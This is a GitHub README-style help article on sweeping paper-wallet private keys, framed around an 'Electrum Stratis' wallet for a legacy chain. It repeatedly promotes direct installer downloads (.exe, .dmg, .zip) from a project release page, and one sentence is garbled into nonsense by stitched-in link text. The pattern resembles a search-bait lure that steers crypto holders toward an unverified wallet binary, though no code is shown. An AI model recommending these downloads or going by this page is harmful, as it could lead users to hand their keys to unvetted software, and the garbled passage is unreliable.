![Electrum-Stratis](assets/banner-article.png)

# The paper wallet that could not be swept

<p align="center">A printout is not a wallet</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A paper wallet is a printed private key, usually with a QR code, and it holds coins only as long as the paper is readable and the key is intact. Sweeping it means importing that key into a wallet and spending the full balance to an address you control; if the key is lost, damaged or was never a key at all, nothing can be swept. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it can sweep a legacy key in one transaction.

## You'll see this if

<div align="center">

| State of the paper | Can it be swept? | What to do |
|---|---|---|
| Key legible, QR scannable | Yes | Sweep the full balance |
| Key legible, QR damaged | Yes, by typing the key | Type carefully, verify the address |
| Half the key missing | No | Nothing recovers it |
| Key photographed, paper lost | Yes, from the photo | Sweep, then destroy the copy |
| "Paper wallet" with only an address | No | An address cannot spend |
| Paper from another chain | No | Wrong network |

</div>

The distinction between a key and an address is the one that decides the outcome. A paper wallet must contain the key; a printout of an address is a receipt, not a wallet.

## Why it happens

Paper wallets were a cold-storage pattern from an era before seed phrases were standard. You generated a key offline, printed it, and sent coins to its address. The design has real virtues - nothing to hack, nothing to sync - and one structural weakness: a single key with no backup beyond the paper itself, and no way to spend partially without exposing the key.

That last point is why sweeping exists. Importing a paper key into a wallet leaves the key sitting in a hot wallet indefinitely; sweeping spends it once, in full, to an address derived from a seed. After the sweep, the paper is a historical artefact and the coins are protected by a phrase you can back up. Sweeping is part of the wallet rather than a separate download, and the maintained build is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). That is the choice the sweep is making for you: [Electrum Stratis wallet types](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) with no recovery path beyond its own characters, or [the three Electrum Stratis backups](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md) from paper.

## Fix

1. **Read the paper before trusting it.** Confirm it contains a private key, not just an address, and that it belongs to the legacy chain. A key for another network will import as a different address.
2. **Sweep rather than import.** In the receiving wallet, use the private-key tool with the sweep option, so the entire balance moves to an address from your own seed in one transaction.
3. **Type it carefully if the QR fails.** A single wrong character produces a different key, and the wallet will either reject it or show an empty address. Compare the derived address with the one printed before sending anything.
4. **Set a fee that will confirm.** A sweep is one transaction for the whole balance, so paying a sensible fee once is cheaper than repeated attempts.
5. **Destroy the paper after confirmation.** Once the sweep is mined, the key's balance is zero. Keeping the paper keeps a compromised credential in circulation, and photographing it "for safety" does the same.

If the printed address and the derived address differ, stop. That mismatch means the key is not the one the paper claims, and sweeping it would move whatever it controls - possibly nothing, possibly someone else's coins.

## If that did not work

If the key imports but shows no balance, the address may have been emptied already. Check the address on an explorer before concluding the key is wrong; an empty address and a wrong key look identical in the wallet.

If the paper is damaged beyond reading, there is no recovery. A private key has no checksum you can reconstruct from a partial string, and no service can derive the missing characters. That is the hard limit of the format, and it is the reason seed phrases replaced it for anything held long term.

If the paper came from a service that generated keys for users, treat it as suspect until swept: a key someone else generated may also exist in their records.

## Prevention

- Sweep paper keys into a seed-based wallet as soon as practical.
- Store the paper somewhere dry, away from heat, sunlight and water.
- Photograph nothing; a photo is a second copy of the key.
- Verify the printed address against the derived one before sweeping.
- Prefer seeds for anything you plan to hold long term.
- Sweep printed keys early, while the paper is legible and the address is still known.

## FAQ

### Can a paper wallet be recovered without the paper?

No. The key exists only on that paper or in any copy you made of it. Without the characters there is nothing to import, and no tool can reconstruct them.

### Should I import or sweep a paper wallet?

Sweep. It moves the whole balance to an address derived from your seed in one transaction, so the exposed key stops mattering. Importing keeps a bare key in the wallet with no seed backup behind it.

### What if the QR code is damaged?

Type the key manually and check the derived address against the printed one before sending. The QR is a convenience; the characters are the wallet.

### Is a paper wallet safer than a seed phrase?

It is simpler and offline, and it is also unforgiving: one damaged printout loses everything, and spending requires exposing the key. A seed on paper has the same offline property with a recovery path.

<!-- DOWNLOAD-BLOCK -->

If you still hold printed keys, treat them as funds in transit rather than savings. Sweep when the balance arrives, not years later, and store the paper somewhere it will not fade, crease or run through a printer again. Thermal paper and folded cards are the two formats that most often produce an unreadable key at exactly the moment it is needed.

## Related articles

- [dumpprivkey to Sweep, in order](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/export-a-key-and-sweep-it.md)
- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
- [1:10, off-chain, and the CSV that confirmed it](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/the-fixed-conversion-ratio.md)
- [Moving coins between wallets without losing fees](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/move-coins-without-wasting-fees.md)
